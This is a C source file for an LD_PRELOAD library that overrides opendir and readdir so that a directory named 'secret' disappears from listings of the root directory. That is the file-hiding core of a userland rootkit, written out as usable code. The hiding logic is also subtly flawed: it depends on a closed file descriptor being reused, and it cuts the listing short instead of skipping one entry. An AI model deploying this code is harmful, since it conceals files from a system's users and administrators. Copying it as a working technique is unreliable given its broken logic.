#define _GNU_SOURCE

#include <ctype.h>
#include <stdbool.h>
#include <limits.h>
#include <stdlib.h>
#include <string.h>
#include "dirstream.h"
#include "dirent.h"
#include <unistd.h>
#include <dlfcn.h>
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

/* Function prototypes */
void initialize(void) __attribute__((constructor));
DIR *opendir(const char *name);
struct dirent *readdir(DIR *dirp);

/* Function pointers */
int (*orig_open)(const char * pathname, int flags) = NULL;
struct dirent *(*orig_readdir)(DIR *dirp) = NULL;
DIR *(*orig_opendir)(const char *name) = NULL;


/* Preprocessor Directives */
#ifndef DEBUG
#define DEBUG 1
#endif
/**
 * Logging functionality. Set DEBUG to 1 to enable logging, 0 to disable.
 */
#define LOG(fmt, ...) \
    do { if (DEBUG) fprintf(stderr, "%s:%d:%s(): " fmt, __FILE__, \
            __LINE__, __func__, __VA_ARGS__); } while (0)


/* We'll keep track of the open file descriptors here. If the file descriptor
 * being opened matches our target directory ('/' in this case), then we will
 * store in the list. */
int proc_fds[65535];
int num_fds = 0;


void initialize(void)
{
    orig_readdir = (struct dirent *(*)(DIR *dirp)) dlsym(RTLD_NEXT, "readdir");
    orig_opendir = (DIR * (*)(const char *name)) dlsym(RTLD_NEXT, "opendir");
}

DIR *opendir(const char *name)
{
    //printf("name of dir opened: %s\n", name);
    if (strcmp(name, "/") == 0) {
        /* It's the root directory ... */
	DIR * sd = orig_opendir("/secret");
	proc_fds[num_fds] = dirfd(sd);
	//printf("/secret fd: opendir(): %d\n", proc_fds[num_fds]);
	num_fds++;
	closedir(sd);
    }

    return orig_opendir(name);
}

struct dirent *readdir(DIR *dirp)
{
    struct dirent *entry = orig_readdir(dirp);

    if (entry == NULL) {
        return NULL;
    }

    if(strncmp(entry -> d_name, "secret", 6) == 0 && num_fds > 0) {
        int i;
        int dirpfd = dirfd(dirp);
        //printf("%s readdir():dirpfd: %d\n", entry -> d_name, dirpfd);
        for(i = 0; i < num_fds; i++) {
            if(dirpfd == proc_fds[i]) {
                return NULL;
            }
        }
    }

    return entry;
}
